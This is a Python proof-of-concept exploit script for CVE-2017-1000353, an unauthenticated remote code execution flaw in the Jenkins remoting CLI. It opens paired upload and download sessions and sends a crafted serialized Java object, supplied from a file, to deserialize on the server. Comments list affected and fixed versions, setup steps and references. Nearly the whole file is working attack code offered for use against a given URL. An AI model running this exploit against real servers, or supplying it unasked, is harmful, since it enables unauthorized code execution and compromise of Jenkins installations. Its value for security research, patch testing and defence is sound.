#!/usr/bin/python
# -*- coding: utf-8 -*-

"""
**GIT LOG**

commit 36b8285a41eb28333549e8d851f81fd80a184076
Author: Jesse Glick <jglick@cloudbees.com>
Date:   Mon Mar 6 14:24:52 2017 -0500

    [SECURITY-429] Fixing by blacklisting SignedObject.

**Analysis**

$ git clone https://github.com/jenkinsci/jenkins
$ git checkout origin/stable-2.32
$ git checkout -b stable-2.32
$ java -Djava.ext.dirs=./ Payload.java



$ grep -Ri "void upload" ./
.//core/src/main/java/hudson/model/FullDuplexHttpChannel.java:    public synchronized void upload(StaplerRequest req, StaplerResponse rsp) throws InterruptedException, IOException {


**Vulnerable Jenkins**

$ wget -c http://mirrors.jenkins.io/war/2.45/jenkins.war

or

$ wget -c http://mirrors.jenkins.io/war/2.46/jenkins.war

"""

 
import requests
import uuid
import threading
import time
import logging


logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__file__)

 
class CVE_2017_1000353(object):
    ## CVE ID

    # CVE-2017-1000353

    ## Unauthenticated remote code execution

    # An unauthenticated remote code execution vulnerability allowed attackers to transfer a serialized Java
    # [SignedObject] object to the remoting-based Jenkins CLI, that would be be deserialized using a new
    # [ObjectInputStream], bypassing the existing blacklist-based protection mechanism.

    ## Affected versions

    # - All Jenkins main line releases up to and including 2.56
    # - All Jenkins LTS releases up to and including 2.46.1

    ## Fix

    # - Jenkins main line users should update to 2.57
    # - Jenkins LTS users should update to 2.46.2

    def __init__(self, jenkins_cli_uri, java_serialization_file):
        self.jenkins_cli_uri = jenkins_cli_uri
        self.jenkins_sesuuid = str(uuid.uuid4())
        self.java_serialization_file = java_serialization_file

    def exploit(self):
        threads = [
            threading.Thread(target=self.download),
            threading.Thread(target=self.upload)
        ]

        for thread in threads: thread.start()

    def download(self):
        headers = {
            'Side' : 'download',
            'Session': self.jenkins_sesuuid
        }

        response = requests.post(self.jenkins_cli_uri, headers=headers, data=self.generate_download_payload())
        log.info(response.content)   # If missing, code will not be executed.

    def upload(self, data='asdf'):
        time.sleep(1)
        headers = {
            'Side' : 'upload',
            'Session': self.jenkins_sesuuid
        }
        response = requests.post(self.jenkins_cli_uri, headers=headers, data=self.generate_upload_payload())
        log.info(response.content)

    def generate_download_payload(self):
        return b""

    def generate_upload_payload(self):
        payload = [
            b'<===[JENKINS REMOTING CAPACITY]===>rO0ABXNyABpodWRzb24ucmVtb3RpbmcuQ2FwYWJpbGl0eQAAAAAAAAABAgABSgAEbWFza3hwAAAAAAAAAH4=',
            b'\x00\x00\x00\x00',
            open(self.java_serialization_file, "rb").read()
        ]

        return b''.join(payload)

 
if __name__ == "__main__":
    import sys

    if len(sys.argv) != 2:
        log.info("[*] python {} <http://127.0.0.1:8080/cli>".format(sys.argv[0]))
        sys.exit(1)

    url = sys.argv[1]
    jenkins = CVE_2017_1000353(url, "java_serialization_data.bin")
    jenkins.exploit()


## References

# https://jenkins.io/security/advisory/2017-04-26/
# https://blogs.securiteam.com/index.php/archives/3171
# http://www.securityfocus.com/bid/98056/info
# http://mirrors.jenkins.io/war/
# https://github.com/jenkinsci/jenkins/commit/36b8285a41eb28333549e8d851f81fd80a184076
# https://github.com/jenkinsci/jenkins/blob/36b8285a41eb28333549e8d851f81fd80a184076/core/src/main/java/jenkins/model/Jenkins.java#L817
# https://github.com/phith0n/vulhub/blob/master/jenkins/CVE-2017-1000353/
# https://github.com/ysrc/xunfeng/blob/master/vulscan/vuldb/jenkins_CVE_2017_1000353.py
# http://paper.seebug.org/295/
# http://docs.oracle.com/javase/7/docs/platform/serialization/spec/protocol.html
# https://github.com/fonkap/java_deser/blob/master/java_deser/des.py